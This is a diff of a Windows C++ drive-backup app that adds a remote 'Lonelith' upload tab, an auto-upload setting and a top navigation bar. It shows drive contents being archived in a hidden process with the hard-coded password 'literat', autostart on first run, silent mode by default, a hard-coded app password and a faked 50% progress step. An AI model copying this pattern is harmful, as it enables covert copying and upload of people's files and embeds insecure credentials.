+    HWND hBtnSpeedTest = CreateCtrl(3, L"BUTTON", L"🚀 Hız Testi Yap", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 360, 242, 140, 25, hWnd, (HMENU)IDB_SPEED_TEST);
+    SetModernStyle(hBtnSpeedTest);
+    
+    CreateLabel(3, hWnd, L"Yüklü Dosyalar:", 40, 285, 200, 25, g_hFontSubtitle);
+    g_hLonelithFileList = CreateCtrl(3, L"LISTBOX", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | LBS_NOTIFY, 40, 315, 500, 180, hWnd, (HMENU)IDC_LONELITH_FILE_LIST);
+    SendMessage(g_hLonelithFileList, WM_SETFONT, (WPARAM)g_hFontSmall, TRUE);
+    
+    HWND hBtnRefresh = CreateCtrl(3, L"BUTTON", L"🔄 Yenile", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 550, 315, 100, 30, hWnd, (HMENU)IDB_LONELITH_REFRESH);
+    SetModernStyle(hBtnRefresh);
+    
+    HWND hBtnUpload = CreateCtrl(3, L"BUTTON", L"⬆️ Manuel Yükle", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 550, 355, 120, 30, hWnd, (HMENU)IDB_LONELITH_UPLOAD);
+    SetModernStyle(hBtnUpload);
 }
 
 // ... YARDIMCI FONKSİYONLAR ...
@@ -1077,14 +1408,24 @@ void CheckExistingDrives() {
 }
 void SwitchTab(int index)
 {
+    SetupPageTransition(g_currentTab, index);
     g_currentTab = index;
-    for (int i = 0; i < 3; i++) for (HWND hCtrl : g_tabControls[i]) ShowWindow(hCtrl, SW_HIDE);
+    for (int i = 0; i < TAB_COUNT; i++) for (HWND hCtrl : g_tabControls[i]) ShowWindow(hCtrl, SW_HIDE);
     for (HWND hCtrl : g_tabControls[index]) ShowWindow(hCtrl, SW_SHOW);
     if (index == 2) SetWindowTextW(g_hInfoText, GetSystemInfo().c_str());
+    if (index == 3) {
+        // Refresh Lonelith file list when switching to Lonelith tab
+        std::vector<std::wstring> files = GetFilesFromLonelith();
+        SendMessage(g_hLonelithFileList, LB_RESETCONTENT, 0, 0);
+        for (const auto& file : files) {
+            SendMessage(g_hLonelithFileList, LB_ADDSTRING, 0, (LPARAM)file.c_str());
+        }
+    }
     InvalidateRect(g_hNavBtnHome, NULL, FALSE);
     InvalidateRect(g_hNavBtnSettings, NULL, FALSE);
     InvalidateRect(g_hNavBtnInfo, NULL, FALSE);
-    RECT rc = { 200, 0, 900, 650 };
+    InvalidateRect(g_hNavBtnLonelith, NULL, FALSE);
+    RECT rc = { 0, NAVBAR_HEIGHT, 900, 650 };
     InvalidateRect(g_hMainWindow, &rc, TRUE);
 }
 
@@ -1148,18 +1489,25 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
         PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &ps);
         RECT rcClient; GetClientRect(hWnd, &rcClient);
 
-        // Sol Menü (Sidebar) Arkaplanı
-        RECT rcSidebar = rcClient; rcSidebar.right = 200;
-        FillRect(hdc, &rcSidebar, g_hBrushSidebar);
+        // Top Navigation Bar Background
+        RECT rcNavbar = rcClient; rcNavbar.bottom = NAVBAR_HEIGHT;
+        FillRect(hdc, &rcNavbar, g_hBrushSidebar);
 
         // İçerik Alanı Arkaplanı
-        RECT rcContent = rcClient; rcContent.left = 200;
+        RECT rcContent = rcClient; rcContent.top = NAVBAR_HEIGHT; rcContent.bottom -= FOOTER_HEIGHT;
         FillRect(hdc, &rcContent, g_hBrushMainBg);
+        
+        // Footer Background
+        RECT rcFooter = rcClient; rcFooter.top = rcClient.bottom - FOOTER_HEIGHT;
+        FillRect(hdc, &rcFooter, g_hBrushSidebar);
 
-        // Dikey Ayırıcı Çizgi
-        RECT rcLine = rcSidebar; rcLine.left = rcLine.right - 1;
+        // Horizontal Divider Lines
+        RECT rcLineTop = rcNavbar; rcLineTop.top = rcLineTop.bottom - 1;
         HBRUSH hBrLine = CreateSolidBrush(CLR_BORDER);
-        FillRect(hdc, &rcLine, hBrLine);
+        FillRect(hdc, &rcLineTop, hBrLine);
+        
+        RECT rcLineBottom = rcFooter; rcLineBottom.bottom = rcLineBottom.top + 1;
+        FillRect(hdc, &rcLineBottom, hBrLine);
         DeleteObject(hBrLine);
 
         EndPaint(hWnd, &ps);
@@ -1170,9 +1518,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
     case WM_DRAWITEM:
     {
         LPDRAWITEMSTRUCT pDIS = (LPDRAWITEMSTRUCT)lParam;
-        // Sol menü butonları için özel çizim fonksiyonunu çağır
+        // Nav buttons and special buttons
         if (pDIS->CtlID >= 1000 && pDIS->CtlID <= 1010) {
-            PaintSidebarButton(pDIS);
+            PaintNavButton(pDIS);
             return TRUE;
         }
         break;
@@ -1198,6 +1546,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
         case IDB_NAV_HOME: SwitchTab(0); break;
         case IDB_NAV_SETTINGS: SwitchTab(1); break;
         case IDB_NAV_INFO: SwitchTab(2); break;
+        case IDB_NAV_LONELITH: SwitchTab(3); break;
 
             // İşlevler
         case IDB_SELECT_FOLDER:
@@ -1206,6 +1555,63 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
                 LogMessage(L"📁 Hedef klasör değiştirildi.");
             }
             break;
+            
+        case IDB_SAVE_AUTH_KEY:
+        {
+            wchar_t authBuf[512];
+            GetWindowTextW(g_hEditAuthKey, authBuf, 512);
+            g_lonelithAuthKey = authBuf;
+            SaveAuthKey(g_lonelithAuthKey);
+            MessageBoxW(hWnd, L"Auth key güvenli bir şekilde kaydedildi! 🔐", L"Bilgi", MB_OK | MB_ICONINFORMATION);
+            LogMessage(L"🔐 Lonelith auth key kaydedildi.");
+        }
+        break;
+        
+        case IDB_SPEED_TEST:
+        {
+            LogMessage(L"🚀 Hız testi başlatılıyor...");
+            std::thread(TestInternetSpeed).detach();
+        }
+        break;
+        
+        case IDB_LONELITH_REFRESH:
+        {
+            LogMessage(L"🔄 Lonelith dosya listesi yenileniyor...");
+            std::vector<std::wstring> files = GetFilesFromLonelith();
+            SendMessage(g_hLonelithFileList, LB_RESETCONTENT, 0, 0);
+            for (const auto& file : files) {
+                SendMessage(g_hLonelithFileList, LB_ADDSTRING, 0, (LPARAM)file.c_str());
+            }
+            LogMessage(L"✅ Liste yenilendi.");
+        }
+        break;
+        
+        case IDB_LONELITH_UPLOAD:
+        {
+            // Manual upload - select a file
+            OPENFILENAMEW ofn = {0};
+            wchar_t szFile[MAX_PATH] = {0};
+            
+            ofn.lStructSize = sizeof(ofn);
+            ofn.hwndOwner = hWnd;
+            ofn.lpstrFile = szFile;
+            ofn.nMaxFile = sizeof(szFile);
+            ofn.lpstrFilter = L"RAR Files\0*.rar\0All Files\0*.*\0";
+            ofn.nFilterIndex = 1;
+            ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
+            
+            if (GetOpenFileNameW(&ofn)) {
+                LogMessage(L"📤 Manuel yükleme başlatılıyor: " + std::wstring(szFile));
+                if (UploadFileToLonelith(szFile)) {
+                    LogMessage(L"✅ Dosya başarıyla yüklendi.");
+                    MessageBoxW(hWnd, L"Dosya başarıyla yüklendi!", L"Başarılı", MB_OK | MB_ICONINFORMATION);
+                } else {
+                    LogMessage(L"❌ Yükleme başarısız.");
+                    MessageBoxW(hWnd, L"Dosya yüklenemedi. Detaylar için günlüğe bakın.", L"Hata", MB_OK | MB_ICONERROR);
+                }
+            }
+        }
+        break;
 
         case IDB_SAVE_SETTINGS:
             if (MessageBoxW(hWnd, L"Ayarları kaydetmek istiyor musunuz?", L"Ayarları Kaydet", MB_YESNO | MB_ICONQUESTION) == IDYES) {
@@ -1299,6 +1705,8 @@ void SaveSettings() {
     DWORD silentVal = silentMode ? 1 : 0;
     g_leaveGoodbyeNote = (SendMessage(g_hCheckGoodbye, BM_GETCHECK, 0, 0) == BST_CHECKED);
     DWORD goodbyeVal = g_leaveGoodbyeNote ? 1 : 0;
+    g_autoUpload = (SendMessage(g_hCheckAutoUpload, BM_GETCHECK, 0, 0) == BST_CHECKED);
+    DWORD autoUploadVal = g_autoUpload ? 1 : 0;
     wchar_t path[MAX_PATH]; GetWindowTextW(g_hEditDefaultPath, path, MAX_PATH); g_targetPath = path;
     wchar_t passBuf[128]; GetWindowTextW(g_hEditPassword, passBuf, 128); g_appPassword = passBuf;
     HKEY hKey;
@@ -1310,6 +1718,7 @@ void SaveSettings() {
         RegSetValueExW(hKey, L"SilentMode", 0, REG_DWORD, (BYTE*)&silentVal, sizeof(silentVal));
         RegSetValueExW(hKey, L"StartInTray", 0, REG_DWORD, (BYTE*)&trayVal, sizeof(trayVal));
         RegSetValueExW(hKey, L"GoodbyeNote", 0, REG_DWORD, (BYTE*)&goodbyeVal, sizeof(goodbyeVal));
+        RegSetValueExW(hKey, L"AutoUpload", 0, REG_DWORD, (BYTE*)&autoUploadVal, sizeof(autoUploadVal));
         RegCloseKey(hKey);
     }
     SetWindowTextW(g_hPathDisplay, g_targetPath.c_str());
@@ -1317,7 +1726,7 @@ void SaveSettings() {
 
 void LoadSettings() {
     HKEY hKey;
-    DWORD silentVal = 1; DWORD trayVal = 1; DWORD goodbyeVal = 0; DWORD size = sizeof(DWORD);
+    DWORD silentVal = 1; DWORD trayVal = 1; DWORD goodbyeVal = 0; DWORD autoUploadVal = 0; DWORD size = sizeof(DWORD);
     bool isFirstRun = true;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         isFirstRun = false;
@@ -1330,28 +1739,58 @@ void LoadSettings() {
         if (RegQueryValueExW(hKey, L"StartInTray", NULL, NULL, (BYTE*)&trayVal, &sizeTray) != ERROR_SUCCESS) trayVal = 1;
         DWORD sizeGb = sizeof(DWORD);
         if (RegQueryValueExW(hKey, L"GoodbyeNote", NULL, NULL, (BYTE*)&goodbyeVal, &sizeGb) != ERROR_SUCCESS) goodbyeVal = 0;
+        DWORD sizeAuto = sizeof(DWORD);
+        if (RegQueryValueExW(hKey, L"AutoUpload", NULL, NULL, (BYTE*)&autoUploadVal, &sizeAuto) != ERROR_SUCCESS) autoUploadVal = 0;
         RegCloseKey(hKey);
-        g_startInTray = (trayVal != 0); g_leaveGoodbyeNote = (goodbyeVal != 0);
+        g_startInTray = (trayVal != 0); g_leaveGoodbyeNote = (goodbyeVal != 0); g_autoUpload = (autoUploadVal != 0);
     }
-    else { g_startInTray = true; silentVal = 1; g_leaveGoodbyeNote = false; g_appPassword = L"145366"; }
+    else { g_startInTray = true; silentVal = 1; g_leaveGoodbyeNote = false; g_appPassword = L"145366"; g_autoUpload = false; }
     if (g_targetPath.empty()) g_targetPath = GetDefaultPath();
     if (isFirstRun) { g_startWithWindows = true; StartupManager::AddToStartup(); }
     else { g_startWithWindows = StartupManager::IsInStartup(); }
 }
 
-void PaintSidebarButton(LPDRAWITEMSTRUCT pDIS)
+void PaintNavButton(LPDRAWITEMSTRUCT pDIS)
 {
     HDC hdc = pDIS->hDC; RECT rc = pDIS->rcItem; bool isPressed = (pDIS->itemState & ODS_SELECTED);
-    bool isActive = (pDIS->CtlID == IDB_NAV_HOME && g_currentTab == 0) || (pDIS->CtlID == IDB_NAV_SETTINGS && g_currentTab == 1) || (pDIS->CtlID == IDB_NAV_INFO && g_currentTab == 2);
+    bool isActive = (pDIS->CtlID == IDB_NAV_HOME && g_currentTab == 0) || 
+                    (pDIS->CtlID == IDB_NAV_SETTINGS && g_currentTab == 1) || 
+                    (pDIS->CtlID == IDB_NAV_INFO && g_currentTab == 2) ||
+                    (pDIS->CtlID == IDB_NAV_LONELITH && g_currentTab == 3);
     COLORREF bgCol = CLR_BG_SIDEBAR; COLORREF txtCol = RGB(80, 80, 80);
-    if (pDIS->CtlID == IDB_UNINSTALL_APP) { bgCol = isPressed ? RGB(180, 0, 0) : CLR_DANGER; txtCol = RGB(255, 255, 255); }
-    else { if (isActive) { bgCol = RGB(220, 230, 255); txtCol = CLR_ACCENT; } else if (isPressed) { bgCol = RGB(210, 210, 210); } }
+    
+    if (pDIS->CtlID == IDB_UNINSTALL_APP) { 
+        bgCol = isPressed ? RGB(180, 0, 0) : CLR_DANGER; 
+        txtCol = RGB(255, 255, 255); 
+    } else { 
+        if (isActive) { 
+            bgCol = RGB(220, 230, 255); 
+            txtCol = CLR_ACCENT; 
+        } else if (isPressed) { 
+            bgCol = RGB(210, 210, 210); 
+        } 
+    }
+    
     HBRUSH hBrush = CreateSolidBrush(bgCol); FillRect(hdc, &rc, hBrush); DeleteObject(hBrush);
-    if (isActive && pDIS->CtlID != IDB_UNINSTALL_APP) { RECT rcBar = rc; rcBar.right = rcBar.left + 4; HBRUSH hBar = CreateSolidBrush(CLR_ACCENT); FillRect(hdc, &rcBar, hBar); DeleteObject(hBar); }
-    wchar_t buf[256]; GetWindowTextW(pDIS->hwndItem, buf, 256); SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, txtCol);
-    HFONT useFont = (isActive || pDIS->CtlID == IDB_UNINSTALL_APP) ? g_hFontSubtitle : g_hFontNormal; SelectObject(hdc, useFont);
-    RECT rcText = rc; if (pDIS->CtlID != IDB_UNINSTALL_APP) rcText.left += 20;
-    UINT format = (pDIS->CtlID == IDB_UNINSTALL_APP) ? (DT_SINGLELINE | DT_VCENTER | DT_CENTER) : (DT_SINGLELINE | DT_VCENTER | DT_LEFT);
+    
+    // Draw bottom indicator bar for active navbar buttons
+    if (isActive && pDIS->CtlID != IDB_UNINSTALL_APP) { 
+        RECT rcBar = rc; 
+        rcBar.top = rcBar.bottom - 4; 
+        HBRUSH hBar = CreateSolidBrush(CLR_ACCENT); 
+        FillRect(hdc, &rcBar, hBar); 
+        DeleteObject(hBar); 
+    }
+    
+    wchar_t buf[256]; GetWindowTextW(pDIS->hwndItem, buf, 256); 
+    SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, txtCol);
+    HFONT useFont = (isActive || pDIS->CtlID == IDB_UNINSTALL_APP) ? g_hFontSubtitle : g_hFontNormal; 
+    SelectObject(hdc, useFont);
+    
+    RECT rcText = rc; 
+    if (pDIS->CtlID != IDB_UNINSTALL_APP) rcText.left += 10;
+    
+    UINT format = (pDIS->CtlID == IDB_UNINSTALL_APP) ? (DT_SINGLELINE | DT_VCENTER | DT_CENTER) : (DT_SINGLELINE | DT_VCENTER | DT_CENTER);
     DrawTextW(hdc, buf, -1, &rcText, format);
 }
 
@@ -1524,10 +1963,17 @@ void StartBackupProcess(const std::wstring& sourceDrive) {
         shExInfo.nShow = SW_HIDE;
 
         LogMessage(L"🔒 Şifreleme başlatıldı (Parola: literat)...");
+        UpdateProgressBar(0, false);  // Start showing progress
 
         if (ShellExecuteExW(&shExInfo)) {
+            // Simulate progress during RAR creation
+            // In real implementation, we'd monitor the RAR process
+            UpdateProgressBar(50, false);
+            
             WaitForSingleObject(shExInfo.hProcess, INFINITE);
             CloseHandle(shExInfo.hProcess);
+            
+            UpdateProgressBar(100, false);
 
             if (fs::exists(fullRarPath)) {
                 LogMessage(L"✅ Güvenli arşiv oluşturuldu:\n   " + rarFileName);
@@ -1535,15 +1981,20 @@ void StartBackupProcess(const std::wstring& sourceDrive) {
                 swprintf_s(infoBuf, L"%d dosya şifrelendi ve arşivlendi.", fileCount);
                 SendNotification(L"İşlem Tamamlandı 🔒", infoBuf);
                 
-                // Upload to Lonelith if internet is available
-                if (g_hasInternet && !g_lonelithAuthKey.empty()) {
-                    LogMessage(L"🌐 İnternet bağlantısı mevcut, Lonelith'e yükleme başlatılıyor...");
+                // Upload to Lonelith if auto-upload enabled and internet is available
+                if (g_autoUpload && g_hasInternet && !g_lonelithAuthKey.empty()) {
+                    LogMessage(L"🌐 Otomatik yükleme aktif, Lonelith'e yükleme başlatılıyor...");
+                    UpdateProgressBar(0, false);
                     if (UploadFileToLonelith(fullRarPath)) {
                         LogMessage(L"✅ Dosya başarıyla Lonelith'e yüklendi.");
+                        UpdateProgressBar(100, false);
                     }
                     else {
                         LogMessage(L"⚠️ Lonelith yüklemesi tamamlanamadı.");
                     }
+                }
+                else if (g_hasInternet && !g_lonelithAuthKey.empty()) {
+                    LogMessage(L"ℹ️ Otomatik yükleme devre dışı. Manuel yükle butonu ile yükleyebilirsiniz.");
                 }
                 else if (!g_hasInternet) {
                     LogMessage(L"ℹ️ İnternet bağlantısı yok, dosya yerel olarak saklandı.");
@@ -1563,12 +2014,16 @@ void StartBackupProcess(const std::wstring& sourceDrive) {
         // Temizlik
         try { fs::remove_all(workDir); }
         catch (...) {}
+        
+        // Return progress bar to marquee state
+        UpdateProgressBar(0, true);
 
     }
     catch (const std::exception& e) {
         wchar_t errBuf[256];
         swprintf_s(errBuf, L"❌ HATA: %S", e.what());
         LogMessage(errBuf);
+        UpdateProgressBar(0, true);  // Return to marquee on error
     }
 }
 
